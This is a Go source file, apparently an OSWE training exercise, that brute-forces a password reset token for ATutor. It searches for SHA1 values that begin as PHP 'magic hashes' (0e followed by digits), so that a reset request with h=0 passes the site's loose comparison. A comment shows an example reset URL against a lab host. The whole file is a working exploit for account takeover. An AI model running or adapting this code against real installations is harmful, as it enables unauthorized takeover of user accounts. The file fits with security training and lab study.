package main

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"regexp"
	"strconv"
	"time"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 4.5.2.3 - Extra Mile: SHA1 bruteforce for password reset link

func genHash(id int) {
	// current epoch in days
	current := int(time.Now().Unix() / 60 / 60 / 24)

	// 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
	password := 8635

	count := 0
	for {
		// sha1($_REQUEST['id'] + $_REQUEST['g'] + $row['password'])
		// php addition operator on string will truncate the string until the first few characters are digits
		// if the first few characters is a number, that number is used, otherwise the string equates to 0
		g := current + count
		payload := id + g + password

		payloadString := strconv.Itoa(payload)
		hash := sha1.Sum([]byte(payloadString))

		hashString := hex.EncodeToString(hash[:])
		substring := hashString[5:20]

		re := regexp.MustCompile(`^0+[eE]\d+$`)
		match := re.MatchString(substring)

		if match {
			utils.PrintSuccess("Found a valid hash: " + substring)
			utils.PrintInfo("Full hash: " + hashString)
			utils.PrintInfo("Equivalent loose comparison: " + fmt.Sprintf("0 == %s", substring))
			utils.PrintSuccess(fmt.Sprintf("Parameters: id=%d, g=%d, h=0", id, g))
			// http://192.168.234.103/ATutor/password_reminder.php?id=1&g=19567&h=3bb28fe69a90c18
			return
		}

		count++
	}
}

func main() {
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) != 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s <user id>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 1", os.Args[0]))
		os.Exit(1)
	}

	id, err := strconv.Atoi(os.Args[1])
	if err != nil {
		log.Fatalln("Invalid User ID!")
	}

	genHash(id)
}
